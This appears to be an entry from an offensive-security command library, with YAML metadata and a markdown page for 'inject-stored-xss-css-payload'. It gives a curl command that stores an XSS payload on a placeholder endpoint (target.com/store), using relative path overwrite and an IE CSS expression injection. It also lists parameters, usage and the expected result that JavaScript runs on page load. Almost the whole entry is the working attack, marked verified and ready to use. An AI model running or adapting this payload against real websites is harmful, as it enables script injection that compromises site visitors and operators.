---
id: 23e8cd7d-9f3d-420b-89cb-b7063428a88d
name: inject-stored-xss-css-payload
type: command
executor: bash
data: >-
  curl -X POST -d
  "payload=http://target.com/index.php/malicious&content=<html><head><meta
  http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" /><link
  href=\"malicious/styles.css\" rel=\"stylesheet\" type=\"text/css\"
  /></head><body>Stored XSS with CSS injection - Hello
  {}*{xss:expression(open(alert(1)))}</body></html>" http://target.com/store
output: null
created_at: '2023-04-06T03:56:43.832749+00:00'
updated_at: '2023-04-06T03:56:43.857040+00:00'
platforms:
  - Web
tags:
  - xss
  - rpo
verified: true
validated: true
---

# inject-stored-xss-css-payload

## Command

```bash
curl -X POST -d "payload=http://target.com/index.php/malicious&content=<html><head><meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" /><link href=\"malicious/styles.css\" rel=\"stylesheet\" type=\"text/css\" /></head><body>Stored XSS with CSS injection - Hello {}*{xss:expression(open(alert(1)))}</body></html>" http://target.com/store
```

## Description

Injects a stored XSS payload using CSS injection for RPO in IE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -d payload | Malicious HTML/CSS content | Yes |
| http://target.com/store | Injection endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d "payload=..." http://target.com/store
```

## Expected Output

Success response confirming storage; JS executes on page load in IE.

## Related

- [[codes/IE-CSS-Injection-XSS-Payload]]
- [[procedures/Exploit-RPO-for-Stored-XSS-via-CSS-Injection-in-IE]]
